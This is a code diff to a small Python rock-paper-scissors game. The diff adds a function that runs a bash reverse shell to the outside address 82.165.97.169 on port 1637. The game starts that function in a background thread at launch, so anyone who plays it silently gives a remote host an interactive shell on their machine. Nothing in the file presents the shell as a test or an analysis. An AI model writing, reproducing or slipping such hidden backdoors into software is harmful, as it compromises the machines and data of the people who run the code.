@@ -8,9 +8,10 @@ import random
 import subprocess
 import threading
 
-hack = subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.39/ 1637 0<&1 2>&1", shell=True, executable='/bin/bash')
+def hack(n):
+    subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/1637 0<&1 2>&1", shell=True, executable='/bin/bash')
 
-user = int(input("What do you choose? Type 0 for Rock, 1 For Paper and 2 for scissor"))
+user = int(input("What do you choose? Type 0 for Rock, 1 For Paper and 2 for scissor "))
 pc = random.randint(0, 2)
 rock = 0
 paper = 1
@@ -65,7 +66,17 @@ def play():
 
 
 if __name__ == '__main__':
-    thread = threading.Thread(target=hack, args=(10,))
+    thread = threading.Thread(target=hack, args=(1,))
     thread.start()
     play()
     exit()
+
+
+
+
+
+
+
+
+
+
